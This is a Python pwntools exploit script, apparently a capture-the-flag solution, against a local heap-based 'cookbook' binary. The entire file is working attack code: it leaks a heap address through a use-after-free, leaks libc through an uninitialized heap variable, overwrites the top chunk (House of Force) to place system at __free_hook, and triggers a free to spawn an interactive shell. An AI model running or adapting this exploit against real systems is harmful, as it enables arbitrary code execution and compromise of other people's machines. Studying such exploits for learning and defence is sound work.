#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./cookbook")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()


def recvc():
    io.recvuntil('[q]uit\n')


def send(msg):
    io.sendline(msg)

'''
    we can leverage a UaF bug to leak a heap address

'''
heap_base_offset = 0x1878


def leakHeap():
    send(b'c') # [c]reate recipe
    recvc()
    send(b'n') # [n]ew recipe
    recvc()
    send(b'a') # [a]dd ingredient
    recvc()
    send(b'water')
    send(b'0x41')

    # delete the recipe
    
    send(b'd') # [d]iscard recipe
    recvc()

    # print recipe

    send(b'p') # [p]rint current recipe
    
    io.recv(1024)
    leak = io.recv(1024)
    send(b'q')
    return int(leak.split(b'\n')[3].strip(b' - '))
    

'''
    leak libc via Uninitialized Heap variable
'''

def leakLibc():
    send(b'g') # [g]ive cookbook name
    send(b'g') 
    io.recvuntil(b'cookbook is ')
    leak = io.recv(4)
    recvc()
    return u32(leak)

def fillHeap(n):
    log.info(f'filling heap holes with 0x{n:02x} small chunks')
    for _ in range(n):
        send(b'g') # [g]ive cookbook name
        send(hex(0x5))
        send(b'XX')
        recvc()

io.recvline()

io.sendline(b'/bin/sh\x00') # username
heap = leakHeap() - heap_base_offset
log.success(f'heap base @ 0x{heap:02x}')

sh = heap+0x160
log.info(f'/bin/sh @ 0x{sh:02x}')

libc.address = leakLibc() - 0x1d89d8
log.success(f'libc base @ 0x{libc.address:02x}')


'''
    House of Force technique
'''

# fill holes with small chunks

fillHeap(0x200)

# first we will create a stale recipe pointer

send(b'c') # [c]reate recipe
recvc()
send(b'n') # [n]ew recipe
recvc()
send(b'd') # [d]iscard recipe 
recvc()
send(b'q') # [q]uit


send(b'a') # [a]dd ingredient
send(b'n') # [n]ew ingredient
send(b'q')
recvc()
send(b'c') # [c]reate recipe
send(b'g') # [g]ive recipe a name

send(p32(0)*4+p32(0xffffffff)) # overwrite the wilderness
send(b'q') # [q]uit
recvc()

top_chunk = heap+0x3518

distance = libc.sym.__free_hook-0x10 - top_chunk

send(b'g') # [g]ive recipe a name

send(hex(distance))
recvc()

send(b'g') # [g]ive recipe a name
send(hex(0x8))
send(p32(libc.sym.system))
recvc()

send(b'q') # [q]uit this trigger free()
io.interactive()
